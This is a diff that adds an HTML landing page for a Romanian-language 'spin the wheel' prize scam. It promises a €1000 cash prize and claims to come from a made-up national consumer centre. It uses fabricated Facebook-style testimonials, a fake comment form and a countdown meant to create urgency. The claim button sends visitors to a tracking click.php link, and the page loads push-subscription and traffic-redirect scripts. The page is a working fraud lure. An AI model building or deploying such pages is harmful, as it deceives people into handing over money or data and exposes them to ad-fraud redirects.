@@ -1,0 +1,267 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+    <title>Felicitări</title>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    <meta
+      name="alert-message"
+      content="We&#039;re sorry\n\nPlease try again. You have one more chance!"
+    >
+    <link href="css/app.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet"/>
+    <link href="css/app8703.css?id=afa7f110a14f461eee6e" type="text/css" rel="stylesheet" />
+<script>
+function getURLParameter(name) { 
+    return decodeURI( 
+    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '' 
+    ); 
+}
+</script>
+</head>
+  <body
+      >
+    <main id="app" v-cloak>
+      <div class="header">
+        SPIN &amp; VICTORIE
+        <img
+          class="header__icon"
+          src="img/notification.png"
+          alt=""
+        />
+      </div>
+      <div class="step" v-if="!hasWon">
+        <div class="card">
+          <div class="step__text">
+            <div class='step__date'>
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+            </div>
+            <h1 class="step__title">
+              Felicitări utilizatorului <script>document.write(getURLParameter('brand'))</script>, aveți (1) recompensă în așteptare!!
+            </h1>
+            <div class="step__subtitle">
+              Fiecare <span class="strong">{{ DateHelper().getDayName() }}</span> selectăm 10 utilizatori norocoși pentru a primi o recompensă.
+            </div>
+          </div>
+          <div class="step__bar">
+            Revendicați-vă premiul<br/><em>↓</em> Rotiți roata <em>↓</em>
+          </div>
+          <vue-prize-wheel
+            class="prize-wheel"
+            static-image="img/prizewheel_static.png"
+            prize-image="img/default@0.5x.png"
+            :start-at="startPrizewheelAt"
+            v-on:lost="retryModalOpen = true"
+            v-on:finish="hasWon = true"
+          >
+            <template v-slot:spinner>
+              <img
+                src="img/prizewheel_spinner.jpg"
+                class="prize-wheel__wheel"
+                alt=""
+              />
+              <img
+                src="img/default%400.5x.png"
+                class="prize-wheel__prize"
+                alt=""
+              />
+            </template>
+          </vue-prize-wheel>
+        </div>
+      </div>
+      <div class="step" v-if="hasWon && !isLoaded">
+        <div class="card step__loader">
+          <img src="img/loader.gif" alt="Loading"/>
+        </div>
+      </div>
+      <div class="step step--end" v-if="isLoaded">
+        <div class="card card--centered">
+          <div class="step__title step__title--bold">
+            Felicitări!
+			Doar parcurgeți acești pași pentru a primi premiul în numerar de €1000,00!
+          </div>
+        </div>
+        <div class="card">
+			<div>
+            1. Faceți clic pe &#039;Revendicați premiul&#039; pentru a vă revendica premiul. Veți fi redirecționat către site-ul partenerului nostru.
+			</div>
+          <div>
+            2. Urmați pașii de pe site-ul partenerului.
+          </div>
+          <div>
+            <span class="strong">IMPORTANT:</span>
+            Produsul poate deveni indisponibil în orice moment.
+          </div>
+          <div>Alege repede!</div>
+        </div>
+        <div class="card">
+          Oferta este valabilă pentru următoarele <span><span v-html="countdownMinutes">0</span> minute și <span v-html="countdownSeconds">0</span> secunde.</span>
+        </div>
+        <div class="card">
+          <div class="step__prize">
+            <div class="step__prize-image">
+              <img
+                src="img/default%400.5x.png"
+                class="step__prize-image-image"
+                alt="$850.00 Cash"
+              />
+              <div>(2) stânga</div>
+            </div>
+            <div class="step__prize-details">
+              <div class="step__title step__title--bold">**€1000.00 Premiu în bani**</div>
+
+              <script>document.write('<a href="https://'+ getURLParameter('domain') + '/click.php?lp=1" class="step__button">Claim Prize</a>')</script>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="card">
+          <div class="comments__likes">
+            <span class="comments__link">12.068</span> aprecieri în total.
+          </div>
+			<vue-facebook-comment
+             avatar="img/3@0.25x.jpg"
+             nume = "Sophie White"
+             message="Inițial nu eram sigur dacă acest lucru este real sau nu, dar am primit banii de 1000 USD astăzi :D!!"
+             like-text="Like"
+             reply-text="Răspuns"
+             de când-text="acum"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/4@0.25x.jpg"
+             name="James Lee"
+             message="A câștigat cineva ceva la această tombolă?"
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="9 minute"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/10@0.25x.jpg"
+             nume = "Oliver Smith"
+             message="Cum funcționează? Am câștigat un card Amazon acum câțiva ani și toate încercările mele după - nereușit..."
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="32 minute"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/6@0.25x.jpg"
+             name="Amelia Martin"
+             message="Ma poți ajuta? Tocmai am câștigat un card cadou!! Ce ar trebui să fac acum?"
+             :likes="12"
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="55 minute"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/9@0.25x.jpg"
+             nume = "William Jones"
+             message="Premiul în numerar de 1000 USD a venit prin postare astăzi! Mulțumesc !!."
+             :likes="12"
+             image="img/proof.jpg"
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="1 oră"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/5@0.25x.jpg"
+             nume = "Emily Johnson"
+             message="Am văzut această ofertă unică și am dat clic pe ea pentru că am crezut că este falsă. Am văzut anunțul din nou și pentru că m-am plictisit, așa că m-am hotărât să o încerc... Și am primit un NOU iPhone 11 Pro! Ce!! ?!"
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="3 ore"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/1@0.25x.jpg"
+             nume="Ruby Smith"
+             message="Cum funcționează? Am câștigat un card Amazon acum câțiva ani și toate încercările mele după - nereușit..."
+             :likes="21"
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="3 ore"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+           <vue-facebook-comment
+             avatar="img/2@0.25x.jpg"
+             nume="Alexander Martin"
+             message="Nu eram sigur dacă este adevărat sau nu, dar am primit cardul azi!! 😍 uimitor 🔥 🔥"
+             :likes="1"
+             like-text="Like"
+             reply-text="Răspuns"
+             since-text="6 ore"
+             v-on:reply="$refs.reply.focus()"
+           ></vue-facebook-comment>
+          <p class="card__paragraph comments__link">
+            Vezi 83 de comentarii mai vechi
+          </p>
+        </div>
+        <div class="card">
+          <div class="comments__form">
+            <label for="reply">Adăugați răspuns:</label>
+            <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+            <p class="card__paragraph">
+              <button onclick="alert('Thank you for your comment, it will be published after being reviewed.');">
+                Trimite
+              </button>
+            </p>
+          </div>
+        </div>
+      </div>
+      <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+        <div class="modal__title" style="">Câștigă un premiu în numerar de 1000,00 EUR</div>
+        <img
+          class="modal__image"
+          src="img/default%400.5x.png"
+          alt="$850.00 Cash"
+        />
+        <p>
+          <span class="strong">
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+          </span>
+          <br/>
+          Felicitări utilizatorului <script>document.write(getURLParameter('brand'))</script>!
+           <br/>
+           Centrul Național al Consumatorului dorește să vă mulțumească pentru loialitate.
+           <br/>
+         </p>
+         <p>
+           Învârte roata pentru a revendica premiul tău special 🎁
+           <br>
+           <br>
+           <span class="strong">Mult noroc!</span>
+         </p>
+         <button class="modal__button" v-on:click="welcomeModalOpen = false">OK</button>
+       </vue-modal>
+       <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+         <div class="modal__title" style="">Încercați din nou!</div>
+         <p>
+           *** Ai câștigat o învârtire suplimentară ***
+         </p>
+        <button class="modal__button" v-on:click="retryModalOpen = false">OK</button>
+      </vue-modal>
+    </main>
+    <script>window.view = window.view || {};view.offerUrl = "";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script><script>window.view = window.view || {};view.datetimeTranslations = {"ago":":time ago","from_now":":time from now","after":":time after","before":":time before"," year":"1 an|:count years","month":"1 month|:count months","week":"1 săptămână|:count săptămâni","day":"1 day|:count days" ,"hour":"1 oră|:count hours","minute":"1 minute|:count minutes","second":"1 secundă|:count seconds","january":"ianuarie","februarie ":"Februarie","martie":"Martie","aprilie":"Aprilie","mai":"Mai","iunie":"Iunie","iulie":"Iulie","august": "August","september":"Septembrie","october":"Octombrie","noiembrie":"Noiembrie","decembrie":"Decembrie","luni":"Luni","marți":"Marți ","miercuri":"miercuri","joi":"joi","vineri":"vineri","sâmbătă":"sâmbătă","duminică":"duminică"};</script> <script src ="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+        <script
+      src="js/appa2ce.js?id=c1e1d839a41fc2e716b9"
+      type="application/javascript">
+    </script>
+  </body>
+	<script type="text/javascript" src="../../trafficback.js" async></script>   
+	<script type="text/javascript" src="../../pushsubs.js" async></script>
+	<script type="text/javascript" src="../../domain.js" async></script>
+	<!-- <script type="text/javascript" src="../../backunderlink.js" async></script> -->
+	<!-- <script src="https://backunder.com/script.js"></script> -->
+</html>
